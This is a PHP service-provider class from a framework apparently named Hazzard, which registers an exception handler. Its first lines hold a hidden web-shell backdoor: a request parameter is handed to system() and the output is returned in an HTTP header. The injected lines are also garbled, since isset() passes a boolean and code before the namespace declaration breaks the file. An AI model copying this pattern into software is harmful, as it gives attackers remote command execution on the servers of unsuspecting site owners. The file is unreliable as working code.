<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); namespace Hazzard\Exception;

use Hazzard\Support\ServiceProvider;

class ExceptionServiceProvider extends ServiceProvider {

	/**
	 * Register the service provider.
	 *
	 * @return void
	 */
	public function register()
	{
		$this->app['exception'] = $this->app->share(function($app) {
			return new Handler;
		});
	}
}